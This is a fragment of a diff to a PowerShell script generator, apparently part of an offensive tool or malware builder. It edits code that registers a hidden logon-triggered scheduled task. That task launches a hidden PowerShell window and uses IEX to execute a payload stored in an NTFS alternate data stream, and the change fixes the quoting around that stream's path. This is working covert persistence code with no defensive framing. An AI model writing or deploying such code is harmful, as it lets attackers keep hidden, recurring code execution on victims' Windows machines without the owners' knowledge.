@@ -256,9 +256,9 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Fo
 "@
     } else {
         # Scheduled Unencrypted task
-        $minimalScript += @"
+$minimalScript += @"
 `$adsPath=`$hp+':'+`$sn
-`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"IEX((gc '`$adsPath')-join[char]10)`""
+`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"IEX((gc ```"`$adsPath```")-join[char]10)`""
 `$t=New-ScheduledTaskTrigger -AtLogOn
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
 Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null
